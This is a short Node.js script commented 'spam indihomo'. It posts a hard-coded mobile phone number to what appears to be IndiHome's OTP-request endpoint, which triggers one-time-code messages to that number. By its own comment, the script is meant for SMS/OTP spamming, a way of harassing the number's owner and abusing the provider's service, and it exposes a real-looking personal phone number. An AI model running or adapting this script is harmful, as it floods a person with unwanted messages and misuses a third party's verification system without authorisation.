// spam indihomo

const sa = require('superagent')

const url = 'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp/'

const msisdn = {type: 'hp', msisdn: '082299265151'}

const data = JSON.stringify(msisdn)

console.log(data)

sa
  .post(url)
  .send({ data })
  .set('accept', 'json')
  .end((err, res) => {
    if (err) throw err
    console.log(res.text)
  })
